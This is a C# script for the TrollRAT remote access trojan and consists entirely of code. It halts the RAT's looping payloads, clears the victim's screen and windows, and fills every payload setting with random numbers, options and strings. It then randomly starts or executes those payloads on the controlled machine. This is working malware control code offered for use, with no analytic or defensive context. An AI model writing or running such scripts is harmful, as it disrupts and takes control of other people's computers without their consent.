using TrollRAT.Payloads;
using TrollRATActions;

using System;
using System.Linq;
using System.Threading;

foreach (LoopingPayload payload in TrollRAT.Server.Payloads.Where(p => p is LoopingPayload))
	payload.Stop();

Thread.Sleep(500);
	
new PayloadActionClearScreen(null).execute();
new PayloadActionClearWindows(null).execute();

Thread.Sleep(500);

string charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
Random rng = new Random();

foreach (Payload payload in TrollRAT.Server.Payloads) {
	foreach (PayloadSetting setting in payload.Settings) {
		if (setting is PayloadSettingNumber) {
			PayloadSettingNumber number = (PayloadSettingNumber)setting;
			if (number.Title.StartsWith("Delay"))
				number.Value = rng.Next(1, 100);
			else
				number.Value = rng.Next((int)number.Min, (int)number.Max+1);
		} else if (setting is PayloadSettingSelect) {
			PayloadSettingSelect select = (PayloadSettingSelect)setting;
			select.Value = rng.Next(0, select.Options.Length);
		} else if (setting is PayloadSettingString) {
			PayloadSettingString str = (PayloadSettingString)setting;
			
			string x = "";
			int m = rng.Next(4, 100);
			for (int i = 0; i < m; i++)
				x += charset[rng.Next(charset.Length)];
				
			str.Value = x;
		}
	}
	
	if (payload is LoopingPayload)
		if (rng.Next(4) == 0)
			((LoopingPayload)payload).Start();
		else
			((LoopingPayload)payload).Stop();
	else if (payload is ExecutablePayload)
		if (rng.Next(2) == 0)
			((ExecutablePayload)payload).Execute();
}